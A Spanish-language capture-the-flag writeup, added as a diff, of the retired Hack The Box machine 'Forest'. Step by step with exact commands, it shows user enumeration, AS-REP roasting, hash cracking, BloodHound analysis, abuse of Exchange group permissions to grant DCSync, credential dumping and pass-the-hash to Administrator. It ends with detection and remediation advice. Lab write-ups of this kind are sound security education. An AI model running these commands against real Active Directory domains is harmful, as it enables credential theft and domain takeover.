@@ -1,0 +1,93 @@
+---
+title: Forest
+summary: Controlador de dominio sin credenciales iniciales. AS-REP Roasting, BloodHound y DCSync abusando de los permisos de Exchange.
+date: 2026-10-25
+platform: htb
+os: windows
+difficulty: easy
+retired: true
+techniques: [as-rep-roasting, acl-abuse, dcsync, pass-the-hash]
+tools: [nmap, nxc, impacket, hashcat, evil-winrm, bloodhound]
+tags: [active-directory, kerberos, windows]
+# EJEMPLO: muestra el formato de un writeup. Cámbialo por el tuyo o bórralo antes de publicar.
+draft: true
+---
+
+## Resumen
+
+Forest es un controlador de dominio de `htb.local` sin servicios web. La cadena completa:
+
+1. Enumerar usuarios del dominio por RPC sin autenticar.
+2. **AS-REP Roasting** de `svc-alfresco`, que no requiere preautenticación Kerberos.
+3. Crackear el hash offline y entrar por WinRM.
+4. BloodHound muestra que la cuenta puede meter usuarios en *Exchange Windows Permissions*,
+   un grupo con `WriteDacl` sobre el dominio.
+5. Darse permisos de replicación, **DCSync** y pass-the-hash como `Administrator`.
+
+## Reconocimiento
+
+```bash
+nmap -p- -sS --min-rate 5000 -n -Pn 10.10.10.161 -oG allPorts
+nmap -p53,88,135,389,445,5985 -sCV 10.10.10.161 -oN targeted
+```
+
+Kerberos (88), LDAP (389), SMB (445) y WinRM (5985): un controlador de dominio de libro.
+
+## Enumeración de usuarios
+
+La sesión nula por RPC devuelve la lista de usuarios del dominio:
+
+```bash
+nxc smb 10.10.10.161 -u '' -p '' --users
+```
+
+Me quedo con los nombres en `users.txt`, sin las cuentas de sistema (`HealthMailbox*`, `SM_*`).
+
+## AS-REP Roasting
+
+Si una cuenta tiene activado *Do not require Kerberos preauthentication*, cualquiera puede pedir
+un AS-REP en su nombre y crackear offline la parte cifrada con su contraseña.
+
+```bash
+impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
+```
+
+`svc-alfresco` cae con rockyou. Con su contraseña entro por WinRM:
+
+```bash
+evil-winrm -i 10.10.10.161 -u svc-alfresco -p '{{PASS}}'
+```
+
+## Escalada: de Account Operators a DCSync
+
+Con BloodHound se ve la ruta: `svc-alfresco` pertenece, por grupos anidados, a **Account
+Operators**, que puede crear usuarios y añadirlos a casi cualquier grupo no protegido. Uno de esos
+grupos es **Exchange Windows Permissions**, que tiene `WriteDacl` sobre el objeto del dominio.
+
+```powershell
+net user p3i '{{PASS}}' /add /domain
+net group "Exchange Windows Permissions" p3i /add
+```
+
+Con `WriteDacl` me concedo los derechos de replicación y hago DCSync:
+
+```bash
+impacket-dacledit -action write -rights DCSync -principal p3i -target-dn 'DC=HTB,DC=LOCAL' 'htb.local/p3i:{{PASS}}'
+impacket-secretsdump 'htb.local/p3i:{{PASS}}@10.10.10.161' -just-dc-ntlm
+impacket-psexec htb.local/Administrator@10.10.10.161 -hashes ':{{HASH}}'
+```
+
+## Cómo se detecta y se corrige
+
+- **AS-REP Roasting**: auditar las cuentas con `DONT_REQ_PREAUTH` y quitarlo. Los eventos 4768
+  con tipo de preautenticación 0 lo delatan.
+- **Grupos de Exchange**: los permisos que instala Exchange sobre el dominio son demasiado amplios;
+  hay que revisarlos y reducirlos.
+- **DCSync**: alertar del evento 4662 con los GUID de replicación cuando no viene de un controlador de dominio.
+
+## Lo que me llevo
+
+Sin credenciales no significa sin opciones: en AD, la enumeración anónima y una cuenta mal
+configurada bastan para empezar, y BloodHound convierte un permiso olvidado en un camino directo a
+Domain Admin.
